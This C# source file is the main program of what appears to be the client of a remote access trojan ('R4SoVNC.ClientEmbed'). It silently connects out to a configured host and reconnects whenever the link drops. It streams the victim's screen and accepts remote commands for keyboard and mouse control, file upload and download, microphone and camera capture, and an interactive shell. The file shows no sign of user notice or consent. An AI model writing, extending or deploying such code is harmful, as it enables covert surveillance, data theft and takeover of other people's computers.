using System;
using System.Threading;
using System.Threading.Tasks;
using R4SoVNC.ClientEmbed.Capture;
using R4SoVNC.ClientEmbed.FileTransfer;
using R4SoVNC.ClientEmbed.Input;
using R4SoVNC.ClientEmbed.Network;
using R4SoVNC.ClientEmbed.Protocol;
using R4SoVNC.ClientEmbed.Shell;

namespace R4SoVNC.ClientEmbed
{
    internal class Program
    {
        private static readonly ServerConnection _conn   = new();
        private static readonly ScreenCapturer   _screen = new(50);
        private static FileHandler?   _files;
        private static AudioCapturer? _audio;
        private static CameraCapturer? _camera;
        private static ShellHandler?  _shell;

        static void Main()
        {
            _files  = new FileHandler(_conn);
            _audio  = new AudioCapturer(_conn);
            _camera = new CameraCapturer(_conn);
            _shell  = new ShellHandler(_conn);

            _conn.PacketReceived += OnPacketReceived;
            _conn.Disconnected   += () =>
            {
                _audio?.Stop();
                _camera?.Stop();
                _shell?.Stop();
                Thread.Sleep(5000);
                TryConnect();
            };

            TryConnect();
            Thread.Sleep(Timeout.Infinite);
        }

        private static void TryConnect()
        {
            while (!_conn.Connect(ClientConfig.HOST, ClientConfig.PORT))
                Thread.Sleep(5000);

            _conn.Send(new Packet(PacketType.ClientInfo, Environment.MachineName));
            Task.Run(ScreenStreamLoop);
        }

        private static async Task ScreenStreamLoop()
        {
            while (_conn.IsConnected)
            {
                try { _conn.Send(new Packet(PacketType.ScreenData, _screen.Capture())); }
                catch { }
                await Task.Delay(33);
            }
        }

        private static void OnPacketReceived(Packet p)
        {
            switch (p.Type)
            {
                case PacketType.MouseMove:          InputHandler.ApplyMouseMove(p.Data);                   break;
                case PacketType.MouseClick:         InputHandler.ApplyMouseClick(p.Data);                  break;
                case PacketType.MouseScroll:        InputHandler.ApplyMouseScroll(p.Data);                 break;
                case PacketType.KeyDown:            InputHandler.ApplyKey(p.Data, true);                   break;
                case PacketType.KeyUp:              InputHandler.ApplyKey(p.Data, false);                  break;
                case PacketType.FileListRequest:    _files!.HandleFileListRequest(p.GetDataAsString());    break;
                case PacketType.FileDownloadReq:    Task.Run(()=>_files!.HandleDownloadRequest(p.GetDataAsString())); break;
                case PacketType.FileUploadRequest:  _files!.HandleUploadRequest(p.Data);                  break;
                case PacketType.FileUploadData:     _files!.HandleUploadData(p.Data);                     break;
                case PacketType.FileUploadComplete: _files!.HandleUploadComplete();                        break;
                case PacketType.MicStart:           _audio?.Start();                                       break;
                case PacketType.MicStop:            _audio?.Stop();                                        break;
                case PacketType.CamStart:           _camera?.Start();                                      break;
                case PacketType.CamStop:            _camera?.Stop();                                       break;
                case PacketType.ShellStart:         _shell?.Start();                                       break;
                case PacketType.ShellCommand:       _shell?.SendCommand(p.GetDataAsString());              break;
                case PacketType.ShellStop:          _shell?.Stop();                                        break;
                case PacketType.Heartbeat:          _conn.Send(new Packet(PacketType.Heartbeat));          break;
                case PacketType.Disconnect:         _conn.Disconnect();                                    break;
            }
        }
    }
}
